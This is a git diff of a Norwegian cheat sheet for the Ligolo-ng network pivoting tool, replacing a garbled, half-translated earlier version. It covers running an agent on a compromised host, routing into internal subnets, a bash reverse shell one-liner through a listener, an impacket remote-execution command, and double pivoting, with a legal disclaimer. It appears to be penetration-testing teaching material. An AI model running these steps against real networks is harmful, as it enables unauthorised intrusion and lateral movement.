@@ -1,12 +1,16 @@
-# 🔀 Ligolo-ng – komplett hurtigreferanse
-
 <!-- language-home-navigation -->
-[🏠 Norsk startside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)
+[🏠 Norsk Hovedside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)
 
-[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)
+[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)
+
+[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇬🇧 English](../README.md)
+
+---
 
 
+# 🔀 Ligolo-ng - Komplett jukseark
 
+[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
 ```
   ██╗     ██╗ ██████╗  ██████╗ ██╗      ██████╗      ███╗   ██╗ ██████╗ 
   ██║     ██║██╔════╝ ██╔═══██╗██║     ██╔═══██╗     ████╗  ██║██╔════╝ 
@@ -16,65 +20,63 @@
   ╚══════╝╚═╝ ╚═════╝  ╚═════╝ ╚══════╝ ╚═════╝      ╚═╝  ╚═══╝ ╚═════╝ 
                  Advanced TUN-based Pivoting Tool
 ```
-
 <p align="center">
   <img src="https://img.shields.io/badge/Ligolo--ng-Pivoting-blue?style=for-the-badge" alt="Ligolo-ng">
-  <img src="https://img.shields.io/badge/TUN_Interface-VPN_Style-green?style=for-the-badge" alt="TUN Interface">
+  <img src="https://img.shields.io/badge/TUN_Interface-VPN_Style-green?style=for-the-badge" alt="TUN-grensesnitt">
   <img src="https://img.shields.io/badge/Go-Cross_Platform-orange?style=for-the-badge" alt="Go">
-  <img src="https://img.shields.io/badge/Network_Pivoting-red?style=for-the-badge" alt="Network Pivoting">
+  <img src="https://img.shields.io/badge/Network_Pivoting-red?style=for-the-badge" alt="Nettverkspivoting">
 </p>
 
 <p align="center">
-  <b>🌐 Modern, simple, and high-performance pivoting tool using TUN interfaces instead of SOCKS proxies</b>
+  <b>🌐 Moderne, enkelt og høyytelses pivoteringsverktøy som bruker TUN-grensesnitt i stedet for SOCKS-proxyer</b>
 </p>
 
 ---
 
 ## 📋 Innholdsfortegnelse
 
-- [Introduksjon](#-introduction)
-- [Why Ligolo-ng? (Ligolo-ng vs SOCKS/Proxychains)](#-why-ligolo-ng)
-- [Architecture & How It Works](#-architecture--how-it-works)
-- [Installasjon](#-installation)
-- [Quick Start Guide](#-quick-start-guide)
-  - [Installasjon](#step-1-setup-tun-interface-on-attacker)
-  - [Installasjon](#step-2-start-the-ligolo-ng-proxy)
-  - [Run the proxy using self-signed TLS certificates:](#step-3-deploy-the-agent-on-pivot-target)
-  - [On Linux Target:](#step-4-configure-routing-on-attacker)
-  - [Once the agent connects, inspect its network interfaces from the proxy console to determine the target's internal subnets (e.g., `172.16.1.0/24`).](#step-5-start-the-tunnel-session)
-- [Reverse Port Forwarding (Listeners)](#-reverse-port-forwarding-listeners)
-- [Double Pivoting (Multi-Tier Pivoting)](#-double-pivoting-multi-tier-pivoting)
-- [Ressurser og referanser](#-proxy-interactive-commands-reference)
-- [Alternativer og parametere](#-agent-command-line-options)
-- [Troubleshooting & Best Practices](#-troubleshooting--best-practices)
-- [Legal Disclaimer](#-legal-disclaimer)
-- [Ressurser og referanser](#-resources)
+– [Introduksjon](#-introduksjon)
+- [Hvorfor Ligolo-ng? (Ligolo-ng vs SOCKS/Proxychains)](#-why-ligolo-ng)
+- [Arkitektur og hvordan det fungerer](#-arkitektur--hvordan-det-fungerer)
+- [Installasjon](#-installasjon)
+- [Hurtigstartguide](#-hurtigstartguide)
+  - [Trinn 1: Konfigurer TUN-grensesnitt på angriper](#step-1-setup-tun-interface-on-attacker)
+  - [Trinn 2: Start Ligolo-ng-proxyen](#step-2-start-the-ligolo-ng-proxyen)
+  - [Trinn 3: Distribuer agenten på pivotmål](#step-3-deploy-the-agent-on-pivot-target)
+  - [Trinn 4: Konfigurer ruting på angriper](#step-4-configure-routing-on-attacker)
+  - [Trinn 5: Start tunneløkten](#step-5-start-the-tunnel-session)
+- [Reverse Port Forwarding (Listeners)](#-reverse-port-videresending-lyttere)
+- [Dobbelpivoting (Flerlagspivoting)](#-dobbelpivoting-flerlagspivoting)
+- [Proxy Interactive Commands Reference](#-proxy-interactive-commands-reference)
+- [Agent kommandolinjealternativer](#-agent-kommandolinjealternativer)
+– [Feilsøking og beste fremgangsmåter](#-feilsøking--beste praksis)
+– [Juridisk ansvarsfraskrivelse](#-juridisk ansvarsfraskrivelse)
+- [Ressurser](#-ressurser)
 
 ---
 
 ## 🎯 Introduksjon
 
-**Ligolo-ng** is an advanced, lightweight, and fast tunneling and pivoting tool written in Go. Unlike traditional SOCKS proxies (such as standard Chisel or SSH dynamic forwarding), Ligolo-ng establishes a virtual **TUN interface** directly on your attacker machine.
+**Ligolo-ng** er et avansert, lett og raskt verktøy for tunnelering og svinging skrevet i Go. I motsetning til tradisjonelle SOCKS-proxyer (som standard Chisel eller SSH dynamisk videresending), etablerer Ligolo-ng et virtuelt **TUN-grensesnitt** direkte på angripermaskinen din.
 
-This turns your compromised pivot host into a true VPN-like gateway: all tools on your attacker machine (including `nmap -sS`, `crackmapexec`, `evil-winrm`, `impacket`, and browsers) can access internal subnets directly by IP address without prefixing commands with `proxychains`.
-
----
-
-## ⚖️ Why Ligolo-ng?
-
-|Feature|Ligolo-ng|Proxychains + SOCKS|SSH SOCKS (`-D`)|
-|---------|-----------|---------------------|------------------|
-|**Protocol Support**|Full TCP & UDP|TCP only (poor UDP)|TCP only|
-|**Nmap SYN Scan (`-sS`)**|✅ Yes (Native)|❌ No (Requires TCP `-sT`)|❌ No|
-|**Tool Compatibility**|100% (Kernel IP stack)|Inconsistent (LD_PRELOAD)|Inconsistent|
-|**Speed & Latency**|⭐⭐⭐⭐⭐ Very Fast|⭐⭐⭐ Moderate|⭐⭐⭐ Moderate|
-|**No SOCKS Wrapper**|✅ Yes|❌ Requires wrapper|❌ Requires wrapper|
-|**Reverse Listeners**|✅ Built-in|❌ Requires separate tool|❌ Limited|
+Dette gjør din kompromitterte pivotvert til en ekte VPN-lignende gateway: alle verktøy på angripermaskinen din (inkludert `nmap -sS`, `crackmapexec`, `evil-winrm`, `impacket` og nettlesere) kan få tilgang til interne undernett direkte via IP-adresse uten å prefiksere kommandoer med `proxychains`.
 
 ---
 
-## 🏗️ Architecture & How It Works
+## ⚖️ Hvorfor Ligolo-ng?
 
+| Funksjon | Ligolo-ng | Proxychains + SOKKER | SSH SOKKER (`-D`) |
+|--------|--------|---------------------|----------------|
+| **Protokollstøtte** | Full TCP og UDP | Bare TCP (dårlig UDP) | Kun TCP |
+| **Nmap SYN Scan (`-sS`)**| ✅ Ja (innfødt) | ❌ Nei (Krever TCP `-sT`) | ❌ Nei |
+| **Verktøykompatibilitet** | 100 % (Kjerne IP-stabel) | Inkonsekvent (LD_PRELOAD) | Inkonsekvent |
+| **Hastighet og ventetid** | ⭐⭐⭐⭐⭐ Veldig rask | ⭐⭐⭐ Moderat | ⭐⭐⭐ Moderat |
+| **Ingen SOCKS Wrapper** | ✅ Ja | ❌ Krever innpakning | ❌ Krever innpakning |
+| **Reverselyttere** | ✅ Innebygd | ❌ Krever eget verktøy | ❌ Begrenset |
+
+---
+
+## 🏗️ Arkitektur og hvordan det fungerer
 ```
 +-------------------+                          +---------------------+                          +----------------------+
 |  Attacker Machine |                          | Pivot Target (Host) |                          | Internal Subnet Host |
@@ -87,17 +89,15 @@ This turns your compromised pivot host into a true VPN-like gateway: all tools o
 | (172.16.1.0/24)   |                          |     (172.16.1.10)   |                          | (Port 445, 80, etc.) |
 +-------------------+                          +---------------------+                          +----------------------+
 ```
-
-1. **Proxy:** Runs on your attacker machine, manages sessions, and bridges packets between your virtual TUN interface and connected agents.
-2. **Agent:** A lightweight binary executed on the compromised internal machine (Linux, Windows, macOS, or ARM).
-3. **TUN Interface:** A software loopback network interface created on Linux that routes traffic destined for internal subnets straight into Ligolo.
+1. **Proxy:** Kjører på angripermaskinen din, administrerer økter og kobler pakker mellom ditt virtuelle TUN-grensesnitt og tilkoblede agenter.
+2. **Agent:** En lett binær som kjøres på den kompromitterte interne maskinen (Linux, Windows, macOS eller ARM).
+3. **TUN-grensesnitt:** Et programvare loopback-nettverksgrensesnitt opprettet på Linux som ruter trafikk destinert for interne undernett rett inn i Ligolo.
 
 ---
 
 ## 📥 Installasjon
 
-3. **TUN Interface:** A software loopback network interface created on Linux that routes traffic destined for internal subnets straight into Ligolo.
-
+Last ned de siste utgivelsesbinærfilene for både **proxy** og **agent** fra den offisielle GitHub-utgivelsessiden:
 ```bash
 # Download latest proxy for Linux
 wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_proxy_0.7.2-alpha_linux_amd64.tar.gz
@@ -112,15 +112,13 @@ tar -zxvf ligolo-ng_agent_0.7.2-alpha_linux_amd64.tar.gz -C /opt/ligolo-agents/l
 wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_agent_0.7.2-alpha_windows_amd64.zip
 unzip ligolo-ng_agent_0.7.2-alpha_windows_amd64.zip -d /opt/ligolo-agents/windows/
 ```
-
 ---
 
-## 🚀 Grunnleggende syntaks
+## 🚀 Hurtigstartguide
 
-### Installasjon
+### Trinn 1: Sett opp TUN-grensesnitt på angriper
 
-Before running the proxy, create a persistent TUN device on your Linux attacker machine:
-
+Før du kjører proxyen, lag en vedvarende TUN-enhet på din Linux-angripermaskin:
 ```bash
 # Create a TUN interface named "ligolo"
 sudo ip tuntap add user $USER mode tun ligolo
@@ -131,39 +129,33 @@ sudo ip link set ligolo up
 # Verify interface state
 ip link show ligolo
 ```
+### Trinn 2: Start Ligolo-ng Proxy
 
-### Installasjon
-
-Before running the proxy, create a persistent TUN device on your Linux attacker machine:
-
+Kjør proxyen ved å bruke selvsignerte TLS-sertifikater:
 ```bash
 cd /opt/ligolo-proxy/
 ./proxy -self-cert -laddr 0.0.0.0:11601
 ```
+> **Tips:** Du kan også gi gyldige Let's Encrypt-sertifikater ved å bruke `-certfile` og `-keyfile` for sniking i Red Team-engasjementer.
 
-Step 2: Start the Ligolo-ng Proxy
+### Trinn 3: Distribuer agenten på Pivot Target
 
-### Run the proxy using self-signed TLS certificates:
+Overfør agenten til den kompromitterte verten og utfør den:
 
-Transfer the agent to your compromised host and execute it:
-
-#### > **Tip:** You can also provide valid Let's Encrypt certificates using `-certfile` and `-keyfile` for stealth in Red Team engagements.
+#### På Linux-mål:
 ```bash
 chmod +x agent
 ./agent -connect 192.168.1.100:11601 -ignore-cert
 ```
-
-#### On Windows Target:
+#### På Windows-mål:
 ```powershell
 .\agent.exe -connect 192.168.1.100:11601 -ignore-cert
 ```
+### Trinn 4: Konfigurer ruting på angriper
 
-### On Linux Target:
+Når agenten kobler til, inspiser nettverksgrensesnittene fra proxy-konsollen for å finne målets interne undernett (f.eks. `172.16.1.0/24`).
 
-Once the agent connects, inspect its network interfaces from the proxy console to determine the target's internal subnets (e.g., `172.16.1.0/24`).
-
-On your **attacker terminal** (separate window), add a route pointing to the TUN interface:
-
+På din **angriperterminal** (separat vindu), legg til en rute som peker til TUN-grensesnittet:
 ```bash
 # Route internal subnet through ligolo TUN device
 sudo ip route add 172.16.1.0/24 dev ligolo
@@ -171,20 +163,16 @@ sudo ip route add 172.16.1.0/24 dev ligolo
 # Check route table
 ip route show | grep ligolo
 ```
+### Trinn 5: Start tunneløkten
 
-### Once the agent connects, inspect its network interfaces from the proxy console to determine the target's internal subnets (e.g., `172.16.1.0/24`).
-
-On your **attacker terminal** (separate window), add a route pointing to the TUN interface:
-
+I den interaktive Ligolo-ng proxy-prompten:
 ```text
 ligolo-ng » session
 ? Select a session: 1 - user@PIVOT-HOST - 192.168.1.50:52418
 [Agent : user@PIVOT-HOST] » start
 [Agent : user@PIVOT-HOST] » INFO[0025] Tunnel started
 ```
-
-Step 5: Start the Tunnel Session
-
+Nå har du direkte, naturlig IP-tilgang til det interne nettverket! Test det:
 ```bash
 # Ping internal host
 ping -c 3 172.16.1.50
@@ -195,114 +183,107 @@ nmap -sS -Pn -T4 -p 80,445,3389 172.16.1.50
 # Run Impacket directly
 impacket-wmiexec DOMAIN/admin:Password@172.16.1.50
 ```
-
 ---
 
-## 🔄 Reverse Port Forwarding (Listeners)
+## 🔄 Videresending av omvendt port (lyttere)
 
-Want to receive a reverse shell or catch an NTLM authentication relay on your attacker box from an internal host that cannot route back to your attacker IP? Use **listeners**!
+Vil du motta et omvendt skall eller fange et NTLM-autentiseringsrelé på angriperboksen din fra en intern vert som ikke kan rute tilbake til angriperens IP? Bruk **lyttere**!
 
-When you configure a listener in Ligolo-ng, the agent opens a listening port on the **pivot machine** and relays incoming traffic back to your attacker machine.
+Når du konfigurerer en lytter i Ligolo-ng, åpner agenten en lytteport på **pivotmaskinen** og videresender innkommende trafikk tilbake til angripermaskinen din.
 
-### Praktiske eksempler
+### Eksempel: Å fange et omvendt skall
 
-Inside the proxy session:
-
+Inne i proxy-sesjonen:
 ```text
 [Agent : user@PIVOT-HOST] » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
 INFO[0035] Listener created on 0.0.0.0:4444
 ```
-
-Praktiske eksempler
-
+På din **angripermaskin**:
 ```bash
 nc -lvnp 4444
 ```
-
-On an **internal target** (`172.16.1.75`):
-
+På et **internt mål** (`172.16.1.75`):
 ```bash
 # Send reverse shell to the pivot host's internal IP
 bash -i >& /dev/tcp/172.16.1.10/4444 0>&1
 ```
-
-The pivot host forwards the connection straight to your Netcat listener!
+Pivotverten videresender forbindelsen rett til din Netcat-lytter!
 
 ---
 
-## ⛓️ Double Pivoting (Multi-Tier Pivoting)
+## ⛓️ Dobbel pivotering (flerlagspivotering)
 
-The pivot host forwards the connection straight to your Netcat listener!
+Når du får tilgang til dypt nestede nettverk (Subnett A -> Undernett B -> Undernett C):
 
-1. Establish your initial tunnel to Pivot 1 (`172.16.1.10`).
-2. Discover Pivot 2 located in Subnet B (`10.0.0.25`).
-⛓️ Double Pivoting (Multi-Tier Pivoting)
+1. Etabler din første tunnel til Pivot 1 (`172.16.1.10`).
+2. Oppdag Pivot 2 som ligger i undernett B (`10.0.0.25`).
+3. Sett opp en lytter på Pivot 1 for å videresende trafikk fra undernett B tilbake til proxy-porten `11601`:
    ```text
    [Agent : Pivot1] » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
    ```
-When accessing deeply nested networks (Subnet A -> Subnet B -> Subnet C):
+4. Distribuer Ligolo-agenten på Pivot 2 og koble til Pivot 1s IP:
    ```bash
    ./agent -connect 172.16.1.10:11601 -ignore-cert
    ```
-1. Establish your initial tunnel to Pivot 1 (`172.16.1.10`).
+5. En andre økt vil vises i proxyen din! Legg til en rute for undernett C:
    ```bash
    sudo ip route add 10.0.0.0/24 dev ligolo
    ```
-3. Set up a listener on Pivot 1 to forward traffic from Subnet B back to your proxy port `11601`:
+6. Bytt til økt 2 og skriv `start`.
 
 ---
 
-## ⌨️ Ressurser og referanser
+## ⌨️ Proxy Interactive Commands Reference
 
-|Kommando|Beskrivelse|Eksempel|
-|---------|-------------|---------|
-|`session`|List and select active connected agent sessions|`session`|
-|`start`|Start tunneling packets through the active agent|`start`|
-|`stop`|Stop the active tunnel session|`stop`|
-|`ifconfig`|Show network interfaces of the selected agent|`ifconfig`|
-|`listener_add`|Create a listening port on the pivot agent|`listener_add --addr 0.0.0.0:8443 --to 127.0.0.1:8443`|
-|`listener_list`|List all active listeners on current agent|`listener_list`|
-|`listener_close`|Close a specific active listener|`listener_close --id 0`|
-|`help`|Display command help|`help`|
-|`exit`|Terminate proxy or return to main menu|`exit`|
-
----
-
-## ⚙️ Alternativer og parametere
-
-|Flagg|Beskrivelse|Eksempel|
-|------|-------------|---------|
-|`-connect`|Address and port of the Ligolo proxy|`-connect 192.168.1.100:11601`|
-|`-ignore-cert`|Skip TLS certificate verification|`-ignore-cert`|
-|`-retry`|Automatically retry connection if disconnected|`-retry`|
-|`-auto-clear`|Clear terminal output upon execution|`-auto-clear`|
+| Kommando | Beskrivelse | Eksempel |
+|--------|-------------|--------|
+| `session` | List og velg aktive tilkoblede agentsesjoner | `session` |
+| `start` | Start tunnelering av pakker gjennom den aktive agenten | `start` |
+| `stop` | Stopp den aktive tunneløkten | `stop` |
+| `ifconfig` | Vis nettverksgrensesnitt for den valgte agenten | `ifconfig` |
+| `listener_add` | Opprett en lytteport på pivotagenten | `listener_add --addr 0.0.0.0:8443 --to 127.0.0.1:8443` |
+| `listener_list`| Liste alle aktive lyttere på gjeldende agent | `listener_list` |
+| `listener_close`| Lukk en bestemt aktiv lytter | `listener_close --id 0` |
+| `help` | Vis kommandohjelp | `help` |
+| `exit` | Avslutt proxy eller gå tilbake til hovedmenyen | `exit` |
 
 ---
 
-## 💡 Tips og beste praksis
+## ⚙️ Agent-kommandolinjealternativer
 
-1. **Delete TUN Interface After Engagement:**
-   When finished with your test, clean up your routing table and delete the virtual interface:
+| Flagg | Beskrivelse | Eksempel |
+|------|----------------|--------|
+| `-connect` | Adresse og havn til Ligolo proxy | `-connect 192.168.1.100:11601` |
+| `-ignore-cert` | Hopp over TLS-sertifikatverifisering | `-ignore-cert` |
+| `-retry` | Prøv automatisk å koble til på nytt hvis frakoblet | `-retry` |
+| `-auto-clear` | Slett terminalutgang ved utførelse | `-auto-clear` |
+
+---
+
+## 💡 Feilsøking og beste praksis
+
+1. **Slett TUN-grensesnitt etter engasjement:**
+   Når du er ferdig med testen, ryd opp i rutetabellen og slett det virtuelle grensesnittet:
    ```bash
    sudo ip link set ligolo down
    sudo ip tuntap del mode tun ligolo
    ```
-2. **Double-Check IP Subnet Overlaps:**
-   Ensure the internal subnet you are routing (e.g. `192.168.1.0/24`) does not collide with your local attacker network. If it overlaps, use a more specific `/32` host route (e.g., `sudo ip route add 192.168.1.50/32 dev ligolo`).
-3. **Firewall Considerations on Pivot:**
-1. **Delete TUN Interface After Engagement:
-4. **Use `-retry` in Real Environments:**
-   Always run agents with `-retry` to automatically re-establish connections after transient network drops.
+2. **Dobbeltsjekk IP-undernettoverlappinger:**
+   Sørg for at det interne undernettet du ruter (f.eks. `192.168.1.0/24`) ikke kolliderer med ditt lokale angripernettverk. Hvis den overlapper, bruk en mer spesifikk `/32` vertsrute (f.eks. `sudo ip route add 192.168.1.50/32 dev ligolo`).
+3. **Brannmurhensyn på Pivot:**
+   På Windows-mål, sørg for at Windows Defender-brannmuren tillater utgående tilkoblinger på port 11601 eller din valgte lytterport.
+4. **Bruk `-retry` i virkelige miljøer:**
+   Kjør alltid agenter med `-retry` for automatisk å reetablere tilkoblinger etter forbigående nettverksfall.
 
 ---
 
-## ⚠️ Legal Disclaimer
+## ⚠️ Juridisk ansvarsfraskrivelse
 
-> **IMPORTANT:** Ligolo-ng is a powerful network routing utility. It must only be utilized during authorized penetration tests, red team engagements, and ethical security evaluations with explicit written consent.
+> **VIKTIG:** Ligolo-ng er et kraftig nettverksrutingsverktøy. Den må kun brukes under autoriserte penetrasjonstester, røde teamengasjementer og etiske sikkerhetsevalueringer med eksplisitt skriftlig samtykke.
 
 ---
 
-## 📚 Ressurser og referanser
+## 📚 Ressurser
 
-- [Official Ligolo-ng GitHub Repository](https://github.com/nicocha30/ligolo-ng)
-- [Official Ligolo-ng Documentation](https://github.com/nicocha30/ligolo-ng/blob/master/DOCUMENTATION.md)
+- [Offisielt Ligolo-ng GitHub-lager](https://github.com/nicocha30/ligolo-ng)
+- [Offisiell Ligolo-ng-dokumentasjon](https://github.com/nicocha30/ligolo-ng/blob/master/DOCUMENTATION.md)
